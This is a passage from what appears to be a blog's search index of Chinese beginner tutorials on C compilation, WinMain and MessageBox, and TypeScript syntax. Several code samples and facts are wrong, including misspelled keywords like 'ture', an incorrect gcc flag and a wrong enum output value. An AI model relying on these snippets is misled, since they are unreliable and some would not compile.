断点调试断电是为了方便程序员在调试过程中观察程序内部各状态而专门设置的一种调试手段。也就是在调试模式下运行程序过程中，当程序语句运行到设置断点后，暂停程序运行，但是程序当时的内存，寄存器，上下文环境等数据都被保持，并且在源码编辑器中指示出当前停留在代码的哪一行。然后程序员就可以不慌不忙利用调试器查看程序内部状态。\n2.4.3 C语言程序编译过程预处理：预处理就过程实际上是处理”#”,将include包含的头文件直接拷贝到hell.c当中；将#define 定义的宏进行替换，同时将代码中没用的注释部分删除等具体做的事情如下：\n\n将所有的#define 删除，并且展开所有的宏定义。说白了就是字符替换\n处理所有的条件编译指令。#ifdef #idndf #endif等，就是带#的那些\n处理#include，将#include指向的文件插入该行出\n删除所有注释\n添加行号和文件标识，这样的在调试和编译出错的时候才知道是哪一个文件的哪一行。\n保留#pragma 编译器指令，因为编译器需要使用它们。\n\n编译：编译的过程实质上是把高级语言翻译为机器语言，即对a.c做了这些事情。\n\n词法分析\n语法分析\n语义分析\n优化后生成相应的汇编代码\n\n从高级语言到汇编语言再到机器码Gcc -s hello.c -o a.s 可以生成汇编代码Gcc -c hello.c -o a.o 可以将源文件翻译成二进制文件。类Uinx系统编译的结果生成.o文件，Windows系统是生成.obj文件。编译的过程就是把hello.c翻译成二进制文件\n链接就像刚才的hello.c它使用到了C标准库的东西”printf”,但是编译过程只是把源文件翻译成二进制而已，这个二进制还不能直接执行，这个时候就需要做一个动作，将翻译成二进制与需要用到的库绑定在一起。举个例子编译过的过程就是比如人要打你，你打电话叫人。你的人还没到就跟人打，这肯定被人打的惨不忍睹，肯定是你的人到了才打比较保险。\nGcc hello.c -o a 可以生成可执行程序。即Gcc不带任何参数。ldd就可以看到你的可执行程序依赖的库。\n可以看到a.o的大小是1.1k，毕竟它只是把源文件翻译成二进制文件。a却有7k，应该是他多了很多绳子，在运行时候这些绳子就将对应的库函数牵过来。很形象的比喻。\n2.4.4 C语言程序结构\n一个程序由一个或多个源文件组成\n\n预处理指令例如包含头文件全局声明     在函数之外进行的数据声明函数定义     函数用来实现的功能\n\n函数是C程序的主要组成部分\n\n必须包含一个Main函数（只能有一个）每个函数都用来实现若干特定功能被调用的函数可以是库函数，也可以是自己编制设计的函数程序总是从main函数开始执行\n\nC程序对计算机的操作由C语句完成\n\nC程序书写格式是比较自由的，一行可以几个语句，便于阅读只写一行数据声明和语句最后必须有分号C语言本身不提供输入输出语句程序应当包含注释，增加可读性\n","slug":"C_2022.2.22.03","date":"2022-02-22T13:19:00.000Z","categories_index":"程序","tags_index":"教学文档,C语言","author_index":"Arvin"},{"id":"82350a2ea1d339e4b4dfb5db5c6c2012","title":"C语言概述","content":"1.1.1 什么是C语言C语言就是和电脑进行交流的语言。学习C语言是为了进阶C++。\n1.1.2 什么是软件软件：一系列按照特定顺序组织的计算机数据和指令集合。常见的软件：系统软件：如：DOS、Windows、Linux、IOS、Android等。应用软件：如：微信、扫雷、迅雷、QQ等。软件的出现实现了人与计算机之间的更好的交互。交互方式：自然交互界面：声音控制、触摸屏手势识别。图形化界面：这种方式简单直观，使用者易于接受，容易上手操作。命令行方式：需要一个控制台，输入特定的指令，让计算机完成一系列操作。较为麻烦，需要记录住一些命令。\n1.1.3 计算机信息存储位（Bit）：度量数据的最小单位字节（Byte）：最常用的基本单位，一个字节有8BitK ：1K &#x3D; 1024 byteM（兆）：1M &#x3D; 1024 KG（吉）：1G &#x3D; 1024 MT （太）：1T &#x3D; 1024 G\n1.1.4 进制的概念注意：计算机是用二进制存储数据的。十进制： R&#x3D;10 数字集 0123456789二进制： R&#x3D;2   数字集 01八进制： R&#x3D;8   数字集 01234567十六进制：R&#x3D;16 数字集 0~9ABCDEF\n1.1.5 程序与指令指令是对计算机进行程序控制的最小单位。所有的指令的集合称为计算机的指令系统。电脑是X86，手机是 ARM。程序是为了完成一项特定任务而用某种语言来编写的一组指令序列。计算机的大脑或者是心脏就是CPU，它控制着整个计算机运作，每种CPU，都有自己的指令系统，这个指令系统，就是该CPU的机器语言。机器语言是一组由0和1系列组成的指令码，这些指令码，是CPU制作厂商规定出来的，然后发布出来，请程序员遵守。比如下面某CPU指令系统中的两条指令：10000000 加 | 10010000 减要让计算机工作，就得用这样的语言去命令它。这样的命令，不是一条两条，而是上百条。而且不同型号的计算机其计算机语言是不相通的，按着一种计算机的机器指令编制的程序，不能在另一种计算机上执行。终于出现了汇编语言，就是一些标识符取代0与1，一门人类可以比较轻松认识的编程语言。只是这门语言计算机并不认识，所以人类还不能用这个语言命令计算机做事情。所以，有一类专门的程序，既认识机器语言，又认识汇编语言，也就是编译器，将标识符转化为0与1，知道怎么把汇编语言翻译成机器语言。于是人类和机器间的交流，终于又畅通了，而且人类可以比较轻松的编写程序了，也就是编译器，将标识符转化为0与1。汇编语言和机器语言都是面向机器的，机器不同，语言也不同。既然有办法让编译器翻译成机器语言，难道就不能把其他更人性化的语言翻译成机器语言？1954年，Fortran 语言出现了，其后相继出现了类似的语言。这批语言，使程序员摆脱了计算机硬件的限制，把主要精力放在了程序设计上，不在关注底层的计算机硬件。这类语言称为高级语言。同样的，高级语言要被计算机执行，也需要一个翻译程序将其翻译成机器语言，这就是编译程序，简称编译器。这类高级语言解决问题的方法是分析出解决问题所需要的步骤，把程序看作是数据加工的过程。基于这类方法的程序设计语言成为面向过程的语言。C语言就是这种面向过程的程序设计语言。\n1.1.5.1例子：使用指令关机Shutdown -s -t 600 &#x2F;&#x2F; 关机shutdown -a          &#x2F;&#x2F; 取消关机Shutdown -r -t      &#x2F;&#x2F; 重启\n1.1.6 主流语言进化史艾伦·麦席森·图灵（Alan Mathison Turing，1912年6月23日 - 1954年6月7日），英国数学家、逻辑学家，被称为计算机之父，人工智能之父。\n1.1.6.1 PHP是最好的语言出处PHP是最好的语言这个梗不是出自别处，而就是出自PHP的官方文档！PHP is the best language for web programming，but what about other languages?​\nBecause PHP is the best language ever, ever It&#96;s fast ,very powerful, and free.\n1.1.6.2第一代：机器语言第二代：汇编语言第三代：C语言第四代：C&#x2F;C++、ObjectiveC语言第五代：Java、C#、PHP、Lua、Pyhon、VB\n1.1.7 C语言特点代码量小（相对汇编）执行速度快可移植性较差功能强大（上帝之手）过于自由，经验不足易出错编程自由（基本后面的语言都它写的）对平台库依赖较多编写代码实现周期长  可移植性较差\n1.1.8 为什么要学C语言因为强，黑客必备。名企、外企、高新程序员面试必考未来的精英语言\n1.1.9 C语言适用领域计算机领域，C&#x2F;C++大小通吃C语言的应用极为广泛，从网站后台，到底层操作系统，从多媒体应用到大型网络游戏，从主板开发到人工智能均可使用C语言来开发。大公司职位，高薪职位都要求C语言基础好。\n\n可以写网站后台程序\n可以写GUI界面（Windows等可视化操作界面）\n可以针对某个主题写出功能强大的程序库，然后供其他程序方便使用，从而让其他程序节省开发时间。\n可以写出大型游戏的引擎\n可以写出另一个语言\n可以写操作系统和驱动程序，并且只能用C语言编写，Linux操作系统的全部源代码都可以在网上得到，要深入了解操作系统的运行秘密，懂C语言就可以看懂。\n任何设备只要配置了微处理器，就都支持C语言。从微波炉到手机，都是由C语言技术来推动的。嵌入式开发\n\n1.2.0 C语言关键字C语言仅有32个关键字，9种控制语句，却能完成无数的功能。32个关键字：（由系统定义，不能重做其他定义）\n\n\n\nauto\nbreak\ncase\nchar\nconst\n\n\n\ncontinue\ndefault\ndo\ndouble\nelse\n\n\nEnum\nextern\nfloat\nfor\ngo to\n\n\nif\nint\nlong\nregister\nreturn\n\n\nshort\nsigned\nsize of\nstatic\nstruct\n\n\nswitch\ntypedef\nunsigned\nunion\nvoid\n\n\nvolatile\nwhile\n​\n\n\n\n\n​\n\n\n\n\n\n\n​\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n1.2.1 9种控制语句If () ~ else ~For () ~while ()~do ~ while ()ContinueBreakSwitchGo toReturn\n1.2.2 C语言的34种运算符34种运算符：算术运算符：+ - * &#x2F; % ++ –关系运算符：&lt; &lt;&#x3D; &#x3D;&#x3D; &gt; &gt;&#x3D; !&#x3D;逻辑运算符：！ &amp;&amp; ||位运算符：&lt;&lt; &gt;&gt; ~ | ^ &amp;赋值运算符： &#x3D; 及其扩展条件运算符：？：逗号运算符：，指针运算符：* &amp;求字节数：sieze of强制类型转化：（类型）分量运算符：. -&gt;下标运算符：[]其他：：（） -\n2.0 C语言开发环境搭建\nVisual studio（全宇宙最强编译器）\n\n记得勾选C++开发\n","slug":"C_2022.2.22.02","date":"2022-02-22T13:10:00.000Z","categories_index":"程序","tags_index":"教学文档,C语言","author_index":"Arvin"},{"id":"d8cb551b5bafc53f2b07c2cf32c603c4","title":"Windows 游戏编程 — WinMain","content":"#include &lt;Windows.h&gt;\nInt WINAPI  WinMain(_In_ HINSTANCE hInstance,_In_opt HINSTANCE hPrevInstance,_In_ LPSTR lpCmdine,_In_ int nCmdShow)&#123;\n    MessageBox(NULL,L&quot;你好，Visual Studio&quot;,L&quot;消息窗口&quot;,0);\n    Return 0;\n&#125;\nWINAPI 其实就是 _stdcall 有时候也会写作 CALLBACK 它和 WINAPI 等效WinMain 是Windows程序的入口函数\nWinMain的第一个参数：HINSTANCE类型的hInstance，它表示该程序当前运行的实例句柄。我们可以对这个类型HINSTANCE进行字面上的理解，h前缀表示这个参数的类型为handle(句柄)，句柄的意思，而后面的Instance中文意思是实例，将两个意思结合起来，所以这个类型就是实例句柄。hInstance其实就是一个数值。当一个程序在Windows下运行时，它唯一对应一个运行中的实例，也只有运行中的程序实例，才有资格分配到句柄。一个应用程序可以运行多个实例，每运行一个实例，系统都会给该实例分配一个句柄，并且通过hInstance参数传递给程序的入口点WinMain函数。\nWinMain的第二个参数：HINSTANCE类型的hPrevInstance,表示当前实例的前一个实例句柄。​我们可以对这个参数进行字面上的理解，h表示参数类型为句柄，Prev代表先前的(Previous)意思，Instance依旧表示实例，那么组合起来就是先前的实例句柄，这样顾名思义，是不是很好记忆呢，对于这个参数用法，MSDN中明确表示在Win32环境下，该参数总是取NULL，这就是说在Win32环境下这个参数没有存在感，不起任何作用，只是在进行WinMain函数书写时需要将它专门做为一个参数表示出来而已。\nWinMain的第三个参数：LPSTR类型的lpCmdLine，它是一个以空终止的字符串，指定传递给运用程序的命令行参数。依旧是进行参数肢解：lp前缀表示这个参数是一个指针，Cmd表示Command，命令的意思，与Line组合起来就表示命令行。例如在Windows7操作系统下的E盘有一个叫ForTheDream.txt的文件，我们用鼠标双击这个文件时将启动记事本程序(notepad.exe)。此时系统会将E:\\ForTheDream.txt作为命令行的参数传递给记事本程序的WinMain函数，记事本程序会在得到这个文件的路径后，就会在窗口中正确显示这个文件的内容。\nWinMain的第四个参数：int类型的nCmdShow，指定程序窗口应该如何显示，是最大化，最小化，还是隐藏等等。这个参数可有如下取值：\n\n\n\n参数\n值\n意义\n\n\n\nSW_HIDE\n0\n隐藏此窗口并激活另一个窗口\n\n\nSW_MAXIMIZE\n3\n最大化指定的窗口\n\n\nSW_MINIMIZE\n6\n最小化指定的窗口并激活当前Z次序中顶部的窗口\n\n\nSW_RESTOPE\n9\n激活并显示此窗口，如果此窗口被最小化或者最大化了，系统会恢复它到原始尺寸的位置，一个应用程序应该在恢复最小化的窗口时指定此SW_RESTORE标识\n\n\nSW_SHOW\n5\n以当前的尺寸和位置激活与显示指定窗口\n\n\nSW_SHOWMAXIMIZED\n3\n最大化激活并显示这个窗口\n\n\nSW_SHOWMINIMIZED\n2\n最小化激活并显示这个窗口\n\n\nSW_SHOWMINNOACTIVE\n7\n最小化显示这个窗口，与SW_SHOWMINIMIZED唯一的区别是不会去激活指定的窗口\n\n\nSW_SHOWNA\n8\n以当前的尺寸和位置激活与显示指定窗口，与SW_SHOW的唯一区别是不会去激活指定的窗口\n\n\nSW_SHOWNOACTIVATE\n4\n显示一个窗口，若指定的窗口是最小化或者最大化的，系统会恢复其到原始尺寸和位置，与SW_SHOWNORMAL的唯一区别是不会去激活指定的窗口\n\n\nSW_SHOWNORMAL\n1\n激活和显示一个窗口，若指定的窗口是最小化或者最大化的，系统会恢复其到原始尺寸和位置。一个应用程序应该在第一次显示窗口的时候指定这个标识\n\n\nMessageBox函数MessageBox函数，它用于显示一个消息框，可以通过一些参数来设置这个消息框的样式。在MSDN中查到这个函数有如下原型：\nInt WINAPI MessageBox(\n_In_opt_ HWND hWnd,\n_In_opt_ LPCTSTR lpTest,\n_In_opt_ LPCTSTR lpCaption,\n_In_ UINT uType\n);\n这里的_In_opt 类似于之前提到过的_in，只不过是后面多了一个_opt,表示可选的（Optional），两个词组合在一起就表示”可选的输入参数”了。就是说这个参数我们可以自己填内容，不填具体内容的话直接填NULL也行得通，选择权在于我们。\nMessageBox函数第一个参数：HWND类型的hWnd，表示我们显示的消息框所属的窗口的句柄。在进行Windows编程中，我们常常要和句柄打交道，后面我们会具体阐述什么是句柄，在我们的Visual Studio程序中，这个参数设为了NULL，表示消息框是从属于桌面。\nMessageBox函数的第二个参数：LPCTSTR类型的lpText，它是一个以NULL结尾的字符串，表示所要显示的消息的内容。\nMessageBox函数的第三个参数：LPCTSTR类型的lpCaption，它也是一个以NULL结尾的字符串，在其中填我们要显示的消息框的标题的内容。\nMessageBox函数的第四个参数：UINT类型的uType，表示我们消息窗口需要什么样的样式。微软已经为我们定义好了很多可供选择的样式和消息对应的图标，一些常用的样式列表如下：\n\n\n\n标识名（Flags）\n含有精析\n\n\n\nMB_ABORTRETRYIGNORE\n消息框带有三个按钮：Abort、Retry和Ignore\n\n\nMB_OK\n消息框带有唯一一个按钮：OK。需要注意的是，MB_OK 是系统默认的MessageBox函数样式\n\n\nMB_OKCANCEL\n消息框带有两个按钮：OK和Cancel\n\n\nMB_RETRYCANCEL\n消息框带有两个按钮：Retry和Cancel\n\n\nMB_YESNO\n消息框带有两个按钮：YES和NO\n\n\nMB_YESNOCANCEL\n消息框带有三个按钮：YES、NO和Cancel\n\n\n常见的图标我们也是通过一些标识名来指定，如以下几种：\n\n\n\n标识名（Flags）\n含义精析\n\n\n\nMB_ICONWARNING\n“警告”图标\n\n\nMB_ICONASTERISK\n“风险”图标\n\n\nMB_ICONSTOP\n“停止”图标\n\n\n这里只列出了一些常用的标识，完整版可以自行查阅MSDN。想要多个标识一起使用的话，我们可以采用逻辑或（Logical OR）把不同的标识连接起来，具体的符号是键盘上Enter键上方的那条竖杠”|”。比如要创建一个具有YES和NO的按钮并带有”问号”图标的消息框，我们就把uType填成这样：MB_YESNO|MB_ICONQUESTION,非常直观。后面我们也会经常碰到类似的、需要多个标识符同时使用的场合，用一下这条竖杠”|”连接一下就好了。和大多数Win32函数一样，MessageBox函数也有返回值。在Visual Studio示例程序中，这个返回值可以忽略。而如果我们创建了具有对应按钮的消息框，就涉及到按下具体的按键，就需要给出按键的返回值，这样我们就需要判断哪个键被按下了，再对应作出相应的响应。返回值的列表如下：\n\n\n\n返回值类型\n精析\n\n\n\nIDABORT\n按下Abort后的返回值\n\n\nIDCANCEL\n按下Cancel后的返回值\n\n\nIDIGNORE\n按下Ignore后的返回值\n\n\nIDNO\n按下NO之后的返回值\n\n\nIDOK\n按下OK之后的返回值\n\n\nIDRETRY\n按下Retry之后的返回值\n\n\nIDYES\n按下Yes之后的返回值\n\n\n这个短小的函数MessageBox我们算是讲完了。它虽然很简单，但是非常好用，可谓麻雀虽小五脏俱全，特别是在需要向玩家显示出错误消息的时候，比如我们写了一个函数，在程序执行出错的时候我们要知道出错的地方，就可以这样来写：\nif（error）&#123;\nMessageBox（NULL,L&quot;在这里填写出错的信息&quot;,L&quot;在这里填报错信息标题&quot;,0）；\n&#125;\n用MessageBox来显示错误消息的这个方法会贯穿我们游戏编程的始终，如果想让我们的游戏程序遇到问题可以更加智能，就要在我们的游戏程序源代码中多加一些这样的”错误处理”代码。值得一提的是，在运行游戏程序时经常会弹出一个提示框，提示缺失某某D3D的DLL或者MSVR的DLL，程序想要重新安装云云，就是这个MessageBox函数的杰作。\n","slug":"GameCode_WinMain_2022.2.22.01","date":"2022-02-22T12:44:00.000Z","categories_index":"程序","tags_index":"教学文档,游戏开发","author_index":"Arvin"},{"id":"024c24535770958fe5fa10d3d115c7c9","title":"TypeScript 程序流程","content":"运算符算术运算符\n\n\n\n运算符\n说明\n\n\n\n+\n加号\n\n\n-\n减号\n\n\n*\n乘号\n\n\n&#x2F;\n除号\n\n\n%\n取余（取模）\n\n\n++ | –\n自增 | 自减\n\n\n比较运算符\n\n\n\n运算符\n说明\n\n\n\n&gt;\n大于\n\n\n&lt;\n小于\n\n\n&gt;&#x3D;\n大于等于\n\n\n&lt;&#x3D;\n小于等于\n\n\n&#x3D;&#x3D;\n等于\n\n\n&#x3D;&#x3D;&#x3D;\n等于（不仅值还包括类型）\n\n\n!&#x3D;\n不等于\n\n\n!&#x3D;&#x3D;\n不等于（不仅值还包括类型）\n\n\n\nTypeScript\n\nlet num &#x3D; 2 + 3;\nlet num &#x3D; 2 - ( 3 + 3);\n\n&#x2F;&#x2F; 取余\nlet num &#x3D; 10 % 3;\ndocument.write(num);\t&#x2F;&#x2F; 输出为 1 取余等于（3*3 &#x3D; 9）余 1\n\n&#x2F;&#x2F; ++自增\nnum &#x3D; num + 1;\nnum ++;\n++ num;\n&#x2F;&#x2F; 在输出中++是程序会先打印然后执行++操作\ndocument.write(num++ + &quot;&quot;);\ndocument.write(num + &quot;&quot;);\n\n&#x2F;&#x2F;如果要先++再使用可以采用\ndocument.write(++num + &quot;&quot;);\n\n&#x2F;&#x2F; 比较运算\nlet res:boolean &#x3D; 5 &gt; 3;\ndocument.write(res);\t&#x2F;&#x2F; 输出为true\nres &#x3D; 5 &lt; 3;\ndocument.write(res);\t&#x2F;&#x2F; 输出为false\nnum &#x3D; 5\nres &#x3D; num &#x3D;&#x3D; 5;\ndocument.write(res);\t&#x2F;&#x2F; 输出为true\n\nnum &#x3D; 3;\nnum2 &#x3D; &quot;3&quot;;\nres &#x3D; num &#x3D;&#x3D;&#x3D; num2;\t&#x2F;&#x2F; 输出为false\nres &#x3D; num !&#x3D; num2;\t&#x2F;&#x2F; 输出为ture\n\n逻辑运算符\n\n\n\n运算符\n说明\n\n\n\n&amp;&amp;\n逻辑与（并且 | 又）\n\n\n||\n或\n\n\n! ture (或者! false)\n逻辑非（取反）\n\n\n\nTypeScript\n\n&#x2F;&#x2F; 例如：10 &gt; num &gt;2; 但是我们程序不能这样写：\nlet res:boolean &#x3D; null;\nres &#x3D; num &gt; 3 &amp;&amp; &lt; 10;\t&#x2F;&#x2F; num大于3，小于10 结果才为ture 一个为false 则结果为 false\n\n&#x2F;&#x2F; 或者是 num &gt; 10 num &lt; 5;\nres &#x3D; num &gt; 10 || num &lt; 5; &#x2F;&#x2F; 两个有一个为ture 则结果为 ture\n\n&#x2F;&#x2F; 取反\nres &#x3D; !(num &gt; 10); &#x2F;&#x2F;如果（num &gt; 10）为ture 则结果为 false\n\n赋值运算符\n\n\n\n运算符\n说明\n\n\n\n&#x3D;\n赋值\n\n\n+&#x3D;\n加赋值\n\n\n-&#x3D;\n减赋值\n\n\n*&#x3D;\n乘赋值\n\n\n&#x2F;&#x3D;\n除赋值\n\n\n\nTypeScript\n\nlet num：number &#x3D; 3; &#x2F;&#x2F; 将3赋值给num\n\nnum &#x3D; num +3;\t&#x2F;&#x2F; 给num的值加3可以写成：\nnum +&#x3D; 3;\n\n\n判断语句 | 条件控制语句假设有一个值 Age 如果大于18就输出成年人 如果小于18就输出未成年人\n\nTypeScript\n\n&#x2F;&#x2F; if 判断语句 if 表示如果 else 表示否则\nlet age &#x3D; 20;\nif(age &gt; 18)&#123;\n    document.write(&quot;成年人&quot;);\n&#125;else&#123;\n    docment.write(&quot;未成年人&quot;);\n&#125;\n\n&#x2F;&#x2F; 如果大于60为老年人\nif( age &gt; 60)&#123;\n    document.write(&quot;老年人&quot;);\n&#125;else if(age &gt; 18)&#123;\n    doucument.write(&quot;成年人&quot;);\n&#125;else&#123;\n    doucument.write(&quot;未成年&quot;);\n&#125;\n\n&#x2F;&#x2F; 假设 0-59 是一般 60-79 是及格 80-100 是优秀\nlet score &#x3D; 80;\nif(score &gt;&#x3D; 0 &amp;&amp; score &lt; 60)&#123;\n    document.write(&quot;一般&quot;);\n&#125;else if(score &gt;&#x3D; 60 &amp;&amp; score &lt; 80)&#123;\n    document.write(&quot;及格&quot;);\n&#125;else if(score&gt;&#x3D;80&amp;&amp; score &lt;&#x3D;100)&#123;\n    document.write(&quot;优秀&quot;);\n&#125;else&#123;\n    document.write(&quot;系统出错&quot;);\n&#125;\n\n&#x2F;&#x2F; 假设我们有一个num 如果num大于100 我们只允许给它100，否则就输出本身值\nlet num &#x3D; 105;\nif(num &gt; 100)&#123;\n    num &#x3D; 100;\n&#125;\ndocument.write(num);\n&#x2F;&#x2F; 当然我们可以采用三目运算更加快速的解决这个问题 (条件？值1:值2 如果为ture则赋值值1 否则赋值值2)\nnum &#x3D; num &gt; 100 ? 100 : num;\n\n&#x2F;&#x2F; 假设我们需要多种状态\nenum State&#123;\n    idle,\n    run,\n    attack,\n    die\n&#125;\n\nlet state:State &#x3D; State.idle;\n\nif(state &#x3D;&#x3D; State.idle)&#123;\n    document.write(&quot;站立&quot;);\n&#125;\n&#x2F;&#x2F; 我们可以采用选择结构语句(分支语句) switch:\nswitch(state)&#123;\n    case State.idel:\n        document.write(&quot;站立&quot;);\n        break; &#x2F;&#x2F; 到此结束 \n    case State.run:\n        document.write(&quot;跑步&quot;);\n        break;\n    case State.attack:\n        document.write(&quot;攻击&quot;);\n        break;\n    default: &#x2F;&#x2F;如果以上都没进来就执行：\n        document.write(&quot;死亡&quot;);\n&#125;\n\n\n循环控制语句\nTypeScript\n\n&#x2F;&#x2F; while() 循环判断 我们先输出5个HelloWorld\nlet i:number &#x3D; 0;\nlet num:number &#x3D; 0;\nwhile(i &lt; 5)&#123;\n   document.write(&quot;Hello World&quot;);\n    i++;\n&#125;\ndocument.write(num + &quot;&quot;)\n\n&#x2F;&#x2F; 我们在游戏开发中通常有while做成死循环检测或执行游戏全生命周期的事件\nwhile(ture)&#123;\n\t&#x2F;&#x2F; 游戏中持久生命周期事件\n&#125;\n\n&#x2F;&#x2F; 假设我们要打印出100以内的所有偶数的和\nlet i:number &#x3D; 0;\nlet num: number &#x3D; 0;\nwhile(i &lt; 101)&#123;\n    if(i % 2 &#x3D;&#x3D; 0)&#123;\n        num +&#x3D; i;\n    &#125;\n    i++;\n&#125;\ndocument.wirte(num +&quot;&quot;);\n\n&#x2F;&#x2F; do ... while 循环 第一次无论如何就进行执行一次 再进行循环、判断\nlet i:number &#x3D; 1;\ndo&#123;\n    document.write(&quot;do.while 循环&quot;);\n&#125;while(i &lt; 0);\n\n&#x2F;&#x2F; 我们有一个数组代表人名,我们需要将数组内容逐步打印出来：\nlet names:string[] &#x3D; [&quot;张三&quot;,&quot;李四&quot;,&quot;王五&quot;]\ndocument.write(names[0]);\t&#x2F;&#x2F; 这样的打印方法是效率很低的，且不好管理\n&#x2F;&#x2F; 我们用遍历方式\nlet i :number &#x3D; 0;\nwhile(i &lt; 3)&#123;\n    document.write(name[i]);\n    i++;\n&#125;\n\n&#x2F;&#x2F; 当然还要一个循环方式更加便捷，省去我们在外面创建变量和自增\nfor(let i &#x3D; 0;i &lt; 3; i++;)&#123;\n    document.write(names[i]);\n&#125;\n\n&#x2F;&#x2F; 当然在后面为了更加便捷还有一种for循环 它会遍历数组直到全部完成\nfor(let tmpName of nams)&#123;\n    document.write(tmpName);\n&#125;\n\n&#x2F;&#x2F; in 不会输出遍历数组的值而是遍历输出数组的索引\nfor(let index in names)&#123;\n    document.write(indx);\t&#x2F;&#x2F; 输出 0 1 2\n&#125;\n\n&#x2F;&#x2F; 当然我们可以在循环中退出来\nfor(let i &#x3D;0; i &lt; 10; i++)&#123;\n    if(i &gt; 5)&#123;\n        break; &#x2F;&#x2F;跳出for循环 这个方法可以用在所有循环，但是注意它只会跳出自己最近的循环，如果是嵌套循环，它只能跳出第一层\n    &#125;\n&#125;\n\n","slug":"TypeScript_JS_Learning_2021_12_6_01","date":"2021-12-06T07:22:52.000Z","categories_index":"Script","tags_index":"程序","author_index":"Arvin"},{"id":"c6bdcca557d7825169a4afae27e58649","title":"TypeScript | JavaScript 变量与常量","content":"语句介绍输出语句\ndocument.write(); 只支持输出为字符串类型\n\nTypeScript\n\ndocument.write(&quot;Hello World&quot;);\n\n\nJavaScript\n\ndocument.write(&quot;Hello World&quot;);\n\n\n\n\n\n\n\n\n\n\n可产生变化的输出语句（通过变量）：\n\nTypeScript\n\n&#x2F;&#x2F; 声明变量(let或者Var)：\nlet PersonName &#x3D; &quot;Hello World&quot;;\nPersonName &#x3D; &quot;你好，世界&quot;;\ndocument.write(PersonName);\n\n\nJavaScript\n\nvar PersonName &#x3D; &quot;Hello World&quot;;\nPersonName &#x3D; &quot;你好，世界&quot;;\ndocument.write(PersonName);\n\n\n\n\n\n\n\n\n\n\nconst 常量无法改变\n\nTypeScript\n\n&#x2F;&#x2F; 声明常量\nconst tmp &#x3D; &quot;Hello&quot;;\ndocument.write(tmp);\n\n\n\n\nJavaScript（没有常量）\n\nvar tmp &#x3D; &quot;Hello&quot;;\ndocument.write(tmp);\n\n\n\n\n\n\n\n\n\n\n声明类型限定（只能存储限定类型）\n\nTypeScript\n\n&#x2F;&#x2F; 限定为字符串\nvar PersonName:string &#x3D; &quot;Hello&quot;;\n\n&#x2F;&#x2F; 报错：因为111不是字符串类型而是整型，需要修改成number（int）类型\nvar PersonName：number &#x3D; &quot;Hello&quot;\nPersonName &#x3D; 111;\n\n\n\n\nJavaScript（没有类型限定）\n\nvar PersonName &#x3D; &quot;Hello&quot;;\n\n\n类型\n\n\n\n\n\n\n\n\n在TypeScript | JavaScript 中，如果我们没有给予数据类型，它会根据你的数据自动判断类型。例如：最好写上\n\n\n\n类型\n说明\n\n\n\n枚举\n自己定义一个属于自己的类型\n\n\n联合类型\n一个变量支持两种或多种类型\n\n\nnumber\n整型，与 int 一样\n\n\nstring\n字符串，可以用 + 连接字符串或者连接其他类型，还有模板字符串 &#96;&#96;\n\n\nboolean\n布尔类型，只含两个字：ture（是）| false（否）\n\n\nany\n任何类型（可以包含任何类型）\n\n\narray\n基础数组\n\n\n\nTypeScript\n\n&#x2F;&#x2F; 自动判定为number (int)类型\nlet tmp &#x3D; 333;\n\n&#x2F;&#x2F; 自动将tmp转化为字符串类型\ndocument.write(tmp + &quot;&quot;);\n\n&#x2F;&#x2F; 如果tmp没有赋值则打印 特殊值：undefined (表示你声明了一个变量没有赋值)\nlet tmp:number;\ndocument.write(tmp + &quot;&quot;);\n\n&#x2F;&#x2F; 还有一个特殊值为 null 为空,表示我们主动赋值为空\ntmp &#x3D; null;\ndocument.write(tmp + &quot;&quot;);\n\n\n\n\nJavaScript\n\nvar tmp &#x3D; 333;\n\n\n\n\n\n\n\n\n\n\n模板字符串\n\nTypeScript\n\nlet tmp:number &#x3D; 520;\ndocument.write(&#96;Hello $&#123;tmp&#125;,\nWorld&#96;);\n\n\n\n\n\n\n\n\n\n\nany 可以包含任何类型\n\nTypeScript\n\nlet tmp any &#x3D; false;\ntmp &#x3D; Hello;\ntmp &#x3D; 123;\n\n\n\n\n\n\n\n\n\n\narray 基础数组\n\nTypeScript\n\nlet a:number &#x3D; 1;\nlet b:number &#x3D; 2;\nlet b:number &#x3D; 3;\n&#96;&#96;&#96;&#96;\n\n&#x2F;&#x2F; 数组：首先类型相同，变量含意相同(例如关卡)\nlet a:number[] &#x3D; [0,1,2,3];\ndoucument.write(&#96;A的数组为$&#123;a&#125;&#96;)\n\n&#x2F;&#x2F; string 演示(个子类型都可以用数组表示)：\nlet Names:string[] &#x3D; [&quot;Hello&quot;,&quot;World&quot;]\ndoucument.write(&#96;Name的数组为$&#123;Names&#125;&#96;) \n\n&#x2F;&#x2F; 当然也可以直接用\nlet a:number[] &#x3D; [0,1,2,3];\nlet b:number &#x3D; a[3];\ndoucument.write(&#96;B的数值为$&#123;b&#125;&#96;)\n\n\n\n\n\n\n\n\n\n\n联合类型：一个变量支持两种或多种类型\n\nTypeScript\n\nlet num:number|string &#x3D; 0;\nnum &#x3D; &quot;Hello&quot;;\n\n&#x2F;&#x2F; 报错：不支持布尔类型需要添加\nnum &#x3D; ture;\n\n\n\n\n\n\n\n\n\n\n枚举\n假设我们的游戏通常需要很多不同的颜色，我希望有一个值来表示颜色\n\nTypeScript\n\n&#x2F;&#x2F; 普通方法 \nlet color:number &#x3D; 0;\t&#x2F;&#x2F;0 白色 1 黑色\n&#x2F;&#x2F; 或者玩家的一个状态\nlet state:number &#x3D; 0;\t&#x2F;&#x2F; 0站立 1 跑步 2 死亡 3 攻击\n\n&#x2F;&#x2F; 枚举\nenum Color&#123;\n    red,\n    blue,\n    green\n&#125;\nlet color:Color &#x3D; Color.red;\n&#x2F;&#x2F; 或者玩家的一个状态\nenum State&#123;\n    idle,\n    run,\n    death,\n    attack\n&#125;\nlet state:State &#x3D; state.idle;\n\n\n\n\n\n\n\n\n\n\n注释\n&#x2F;&#x2F; 单行注释\n&#x2F;* 多行注释 *&#x2F;\n\n\n\n\n\n\n\n\n\n\n类型验证\n\nTypeScript\n\nlet X &#x3D; 10;\n&#96;&#96;&#96;&#96;\n&#x2F;&#x2F; 假设我没有定义X的类型(自动判定)，后面我写了很多行代码，忘记了X的类型，我们可以输出X的类型查看\ndocument.write(typeof X);\t&#x2F;&#x2F; 输出类型\n\n&#x2F;&#x2F; 关于枚举\nenum Color&#123;\n    red,\n    blue,\n    green\n&#125;\n\nlet color:Color &#x3D; color.red;\ndocument.write(typeof color);\t&#x2F;&#x2F; 输出为number\ndocument.write(Color.red + &quot;&quot;);\t&#x2F;&#x2F; 输出为1\n&#x2F;&#x2F; 